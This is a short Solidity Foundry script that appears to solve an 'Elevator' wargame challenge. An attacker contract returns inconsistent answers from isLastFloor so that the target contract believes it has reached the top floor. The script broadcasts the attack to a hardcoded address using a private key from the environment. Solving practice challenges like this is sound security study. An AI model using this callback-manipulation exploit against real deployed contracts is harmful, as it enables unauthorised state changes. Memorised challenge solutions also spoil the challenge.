// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Elevator.sol";
import "forge-std/console.sol";
import "forge-std/Script.sol";

contract callElevator {
    Elevator elevator = Elevator(0xd5b42d4189094eC56B76A6c0F1eE65e08ad48584);
    bool top = false;
    function gotoFloor() external {
        console.log(address(this));
        elevator.goTo(1);
    }
    function isLastFloor(uint256 _floor) public returns (bool) {
        if (!top) {
            top = true;

            return false;
        } else {
            top = false;

            return true;
        }
    }
}

contract ElevatorSolution is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        callElevator cE = new callElevator();
        cE.gotoFloor();
        vm.stopBroadcast();
    }
}
